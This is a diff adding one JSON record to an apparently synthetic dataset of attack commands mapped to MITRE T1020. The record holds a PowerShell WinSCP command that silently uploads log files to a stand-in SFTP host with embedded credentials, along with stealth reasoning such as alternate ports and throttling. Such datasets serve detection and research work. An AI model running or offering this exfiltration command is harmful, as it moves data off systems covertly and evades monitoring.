@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/upl/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil:S3cr3t!@192.0.2.55:2222/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"put -speed=512 -resume C:\\ProgramData\\*\\*.log `\"$r`\"\") 'exit' | Out-Null 2>$null",
+  "explanation": "Automates exfiltration of log files over a non-standard SFTP port with bandwidth limiting and resume support to reduce network anomalies.",
+  "rationale_steps": [
+    "Connect to SFTP on alternate port to blend with site policy",
+    "Throttle transfer rate for stealth",
+    "Upload targeted logs recursively with resume",
+    "Run non-interactively and suppress output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-5701d711",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
